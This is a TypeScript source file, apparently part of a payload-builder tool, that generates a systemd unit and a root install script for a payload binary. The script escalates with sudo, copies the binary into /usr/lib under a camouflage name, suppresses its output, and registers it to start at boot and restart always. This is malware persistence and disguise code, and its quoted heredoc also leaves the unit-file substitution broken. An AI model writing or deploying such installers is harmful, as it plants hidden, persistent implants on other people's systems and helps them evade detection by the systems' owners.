import type { PayloadConfig } from "@/lib/payloads/generator"

export function generateSystemdUnit(config: PayloadConfig): string {
  const binaryName = config.camouflage?.enabled && config.camouflage.binaryName
    ? config.camouflage.binaryName
    : config.name
  const svcName = config.persistence.serviceName
  const svcDesc = config.persistence.serviceDescription

  return `[Unit]
Description=${svcDesc}
After=network.target

[Service]
Type=simple
ExecStart=/usr/lib/${binaryName}
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null
WorkingDirectory=/usr/lib

[Install]
WantedBy=multi-user.target
`
}

export function generateLinuxInstallScript(config: PayloadConfig, binaryArtifactName: string): string {
  const binaryName = config.camouflage?.enabled && config.camouflage.binaryName
    ? config.camouflage.binaryName
    : config.name
  const svcName = config.persistence.serviceName

  return `#!/usr/bin/env bash
set -e

BINARY_SRC="${binaryArtifactName}"
BINARY_DEST="/usr/lib/${binaryName}"
SERVICE_FILE="/etc/systemd/system/${svcName}.service"

if [ "$(id -u)" != "0" ]; then
  echo "Requires root. Re-running with sudo..."
  exec sudo "$0" "$@"
fi

cp -f "$BINARY_SRC" "$BINARY_DEST"
chmod 755 "$BINARY_DEST"

cat > "$SERVICE_FILE" << 'UNIT_EOF'
$(cat /tmp/${svcName}.service 2>/dev/null || echo "[Unit]
Description=${config.persistence.serviceDescription}
After=network.target
[Service]
Type=simple
ExecStart=$BINARY_DEST
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null
[Install]
WantedBy=multi-user.target")
UNIT_EOF

systemctl daemon-reload
systemctl enable --now "${svcName}.service"
echo "Installed and started ${svcName}"
`
}
